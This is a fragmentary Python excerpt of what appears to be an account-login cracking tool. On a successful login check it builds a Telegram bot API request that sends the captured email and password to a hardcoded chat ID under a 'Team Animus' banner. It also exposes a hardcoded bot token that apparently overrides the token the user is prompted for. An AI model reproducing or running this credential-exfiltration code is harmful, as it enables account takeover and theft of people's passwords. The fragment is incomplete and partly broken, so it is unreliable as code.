...
print (""" Enter TOKEN
""")
tok = '2076774542:AAEL7e68ANQR74gJpwKxCRMsaCdAi_pfu1c'
sleep(2)
os.system('clear')
(A+' Enter ID ')
print(""" Enter ID
...
if 'TTH' in rss:
    ...
    while True:
        ...
        if 'logged_in_user' in req_login.text:
            ...
            tlg =(f'''https://api.telegram.org/bot2076774542:AAEL7e68ANQR74gJpwKxCRMsaCdAi_pfu1c/sendMessage?chat_id=1702676794&text=𝐍𝐞𝐰 ➥•𝐋𝐨𝐠𝐢𝐧 by Team Animus
❅───────────❅
👤 ➥•𝑬𝒎𝒂𝒊𝒍 : {username}
📟➥•𝑷𝒂𝒔𝒔𝒘𝒐𝒓𝒅 : {password}
❅───────────❅''')
